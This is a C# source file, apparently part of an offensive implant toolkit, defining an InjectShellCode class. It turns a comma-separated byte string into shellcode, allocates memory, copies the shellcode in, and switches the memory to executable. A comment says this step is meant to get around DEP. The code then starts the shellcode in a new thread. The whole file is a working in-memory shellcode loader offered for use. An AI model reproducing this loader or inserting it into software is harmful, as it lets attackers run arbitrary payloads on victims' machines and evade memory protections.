using System;
using System.Runtime.InteropServices;
using System.Text;

using Unmanaged;

namespace WheresMyImplant
{
    internal class InjectShellCode : Base
    {
        //Basis for function, improved to bypass DEP and to take string input
        //https://github.com/subTee/EvilWMIProvider/blob/master/EvilWMIProvider/EvilWMIProvider.cs
        internal InjectShellCode(string shellCodeString)
        {
            const char DELIMITER = ',';
            string[] shellCodeArray = shellCodeString.Split(DELIMITER);
            byte[] shellCodeBytes = new Byte[shellCodeArray.Length];

            for (Int32 i = 0; i < shellCodeArray.Length; i++)
            {
                Int32 value = (Int32)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                shellCodeBytes[i] = Convert.ToByte(value);
            }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)shellCodeBytes.Length;
            IntPtr lpBaseAddress = kernel32.VirtualAlloc(lpAddress, dwSize, kernel32.MEM_COMMIT, Winnt.PAGE_READWRITE);
            WriteOutput(String.Format("Allocating Space at Address {0}", lpBaseAddress.ToString("X4")));
            WriteOutput("Memory Protection Set to PAGE_READWRITE");

            ////////////////////////////////////////////////////////////////////////////////
            Marshal.Copy(shellCodeBytes, 0, lpBaseAddress, shellCodeBytes.Length);
            WriteOutput(String.Format("Injected ShellCode at address ", lpBaseAddress.ToString("X4")));

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpflOldProtect = 0;
            Boolean test = kernel32.VirtualProtect(lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
            WriteOutput("Altering Memory Protections to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            WriteOutput("Attempting to start thread");
            IntPtr hThread = kernel32.CreateThread(lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
            WriteOutput(String.Format("Started Thread: ", hThread.ToString("X4")));

            ////////////////////////////////////////////////////////////////////////////////
            kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}